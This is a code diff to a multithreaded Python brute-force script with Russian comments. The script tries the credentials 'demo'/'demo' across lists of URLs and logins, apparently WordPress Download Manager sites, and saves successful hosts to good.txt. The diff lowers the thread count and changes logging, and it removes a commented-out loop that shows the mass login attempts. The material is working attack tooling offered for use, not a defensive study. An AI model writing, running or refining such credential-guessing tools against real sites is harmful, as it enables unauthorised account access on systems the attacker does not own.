@@ -16,7 +16,7 @@ headers = {
 
 source_file = "source.txt"
 
-theard_count = 200
+theard_count = 100
 def brut(string):
     t = string.split()
     payload = {
@@ -40,28 +40,6 @@ def brut(string):
     else:
         return False
 
-'''res = brut('demo.wpdownloadmanager.com/wpdmpro','demo','demo')
-if res:
-    print('11')
-else:
-    print('00')
-
-for i in range(len(d_list)):
-    url = d_list[i].strip()
-    for i in range(len(l_list)):
-        login = l_list[i].strip()    
-        try:
-            if brut(url, login, 'demo'):
-                print(url)
-                print(login+' demo')
-                open('good.txt', 'a+').write(url + '\n')
-                print('1')
-            else:
-                print(url)
-                print(login+' demo')
-                print('0')
-        except Exception:
-            print('error')'''
 def run(queue, result_queue):
     # Цикл продолжается пока очередь задач не станет пустой
     while not queue.empty():
@@ -72,7 +50,7 @@ def run(queue, result_queue):
         try:
             status = brut(host)
         except Exception:
-            print('Error in '+current_thread())
+            print('Error in thread')
         # сохраняем результат для дальнейшей обработки
         result_queue.put_nowait((status, host))
         # сообщаем о выполнении полученной задачи
@@ -82,7 +60,7 @@ def run(queue, result_queue):
             open('good.txt', 'a+').write(host + '\n')
         else:
             pass
-        #print('{} finished in thread {}. Result={}'.format(host, current_thread(), status))
+        print('Finished in thread {}. Result={}'.format(current_thread(), status))
     print('{} closing'.format(current_thread()))
 
 # MAIN
